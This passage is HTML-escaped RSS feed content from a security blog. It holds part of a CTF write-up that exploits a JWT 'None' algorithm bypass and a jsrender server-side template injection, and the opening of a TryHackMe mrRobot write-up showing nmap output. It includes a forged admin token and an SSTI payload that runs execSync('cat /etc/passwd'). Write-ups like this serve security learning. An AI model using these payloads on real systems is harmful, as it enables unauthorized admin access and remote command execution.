+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;decoded&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;alg&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HS256&amp;#34;&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;jwt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;verify&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sessionCookie&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;tokenKey&lt;/span&gt;, {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;algorithms&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; [&lt;span style=&#34;color:#a6e22e&#34;&gt;decoded&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;alg&lt;/span&gt;],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            });
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;db&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Users&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;findOne&lt;/span&gt;({
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#a6e22e&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;username&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt; },
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;403&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;You are not an admin&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;jwt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;verify&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sessionCookie&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;, {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;algorithms&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; [&lt;span style=&#34;color:#a6e22e&#34;&gt;decoded&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;alg&lt;/span&gt;],
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            });
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;db&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Users&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;findOne&lt;/span&gt;({
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#a6e22e&#34;&gt;where&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;username&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt; },
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    .&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;403&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    .&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;({ &lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;You are not an admin&amp;#34;&lt;/span&gt; });
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;redirect&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/login&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;next&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can see that the webapp uses &lt;code&gt;JWT&lt;/code&gt; for authentication and it uses &lt;code&gt;HS256&lt;/code&gt; algorithm for encrypting the &lt;code&gt;payload&lt;/code&gt;.
+We can also observe that there is a conditional that handles &lt;code&gt;none&lt;/code&gt; in the &lt;code&gt;JWT&lt;/code&gt; header but it does not account for other text like &lt;code&gt;None&lt;/code&gt;, &lt;code&gt;NONE&lt;/code&gt; so we can easily bypass this and perform a JWT header attack and change the payload.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/didactic/pic4.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;My current session &lt;code&gt;JWT&lt;/code&gt; has &lt;code&gt;id=2&lt;/code&gt; so &lt;code&gt;admin&lt;/code&gt; user must have &lt;code&gt;id=1&lt;/code&gt;. Modifying the &lt;code&gt;JWT&lt;/code&gt; header to &lt;code&gt;None&lt;/code&gt; and payload with &lt;code&gt;id=1&lt;/code&gt;. We now have access to admin session.&lt;/p&gt;
+&lt;p&gt;This is the new &lt;code&gt;JWT&lt;/code&gt; token with admin session: &lt;code&gt;eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiaWF0IjoxNjc5Njg5NTkyLCJleHAiOjE2Nzk2OTMxOTJ9.&lt;/code&gt;
+Site use for generating the token &lt;a href=&#34;https://www.gavinjl.me/edit-jwt-online-alg-none/&#34;&gt;JWT&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/didactic/pic5.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now that we have admin dashboard we have a list of users that are registered in the web app. Now lets us find our next vulnerability in the web app through the source code.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;router&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/admin&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;AdminMiddleware&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;req&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;) =&amp;gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;users&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;db&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Users&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;findAll&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;usernames&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;users&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;map&lt;/span&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt;) =&amp;gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;user&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;username&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;render&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;, {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;users&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;jsrender&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;templates&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;usernames&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;render&lt;/span&gt;(),
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            });
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Something went wrong!&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    });
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can see that the username is used directly without any sanitisation or check and rendered in the admin dashboard.
+And here is the &lt;code&gt;admin.jsrender&lt;/code&gt; template.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d-flex justify-content-center align-items-center flex-column&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;style&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;height: 100vh;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;h1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Active&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Users&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/h1&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ul&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;list-group small-list&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      {{&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;users&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;split&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;)}}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;li&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;list-group-item d-flex justify-content-between align-items-center &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;span&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;{{&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;}}&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/span&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/li&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      {{&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/for}}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/ul&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/div&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/body&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So our vulnerability is probably server side template injection.
+Let us use our trusty google to find a valid ssti for this webapp and its templating engine jsrender.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://appcheck-ng.com/template-injection-jsrender-jsviews/&#34;&gt;jsrender&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection&#34;&gt;hacktricks&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;According to hacktricks we can use the payload &lt;code&gt;{{:&amp;quot;pwnd&amp;quot;.toString.constructor.call({},&amp;quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat /etc/passwd&#39;).toString()&amp;quot;)()}}&lt;/code&gt; to invoke a ssti and cat &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;So let&amp;rsquo;s register a user with the payload and see what happens.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/didactic/pic6.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/didactic/pic7.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;We are in! We can modify the payload to do anything we want. cat ../flag.txt to get the flag.&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>[THM] mrRobot writeup</title>
+      <link>/posts/mrrobot/</link>
+      <pubDate>Wed, 01 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/mrrobot/</guid>
+      <description>This is my write up for the Tryhackme mrRobot CTF challenge. The CTF is of easy/medium difficulty but due to the involvement of some enumeration, it was time consuming. The task didn&amp;rsquo;t involve much outside the box thinking and involved copy pasting some scripts and following instructions on GTFObins.
+As always we are given an IP address and we just have to scan the ip using nmap. In CTFs, usually there is a http endpoint at port 80 and we can focus on the http port while our nmap scan is running in the backgroud.</description>
+      <content>&lt;p&gt;This is my write up for the Tryhackme &lt;a href=&#34;https://tryhackme.com/room/mrrobot&#34;&gt;mrRobot&lt;/a&gt; CTF challenge. The CTF is of easy/medium difficulty but due to the involvement of some enumeration, it was time consuming. The task didn&amp;rsquo;t involve much outside the box thinking and involved copy pasting some scripts and following instructions on &lt;a href=&#34;https://gtfobins.github.io&#34;&gt;GTFObins&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/mrRobot/mrRobotBanner.png&#34; alt=&#34;mrRobotBanner&#34;&gt;&lt;/p&gt;
+&lt;p&gt;As always we are given an IP address and we just have to scan the ip using nmap. In CTFs, usually there is a http endpoint at port 80 and we can focus on the http port while our nmap scan is running in the backgroud. It is also the same in the case of this machine.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/mrRobot/mrRobotSite.png&#34; alt=&#34;mrRobotSite&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Checking the ip address on the browser, we are greeted with a really cool terminal themed web environment where we can interact with the site by entering commands. Inspecting the source code and checking the network calls, we don&amp;rsquo;t really find anything interesting. So lets shift our focus to the nmap scan that we ran.&lt;/p&gt;
+&lt;p&gt;Here is a snippet of our nmap scan.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; nmap -sV -sC 10.10.103.189-v
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT    STATE  SERVICE  VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp  closed ssh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp  open   http     Apache httpd
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| http-methods: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_  Supported Methods: GET HEAD POST OPTIONS
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-server-header: Apache
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title: Site doesn&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;t have a title (text/html).
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;443/tcp open   ssl/http Apache httpd
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;| http-methods: 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|_  Supported Methods: GET HEAD POST OPTIONS
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|_http-server-header: Apache
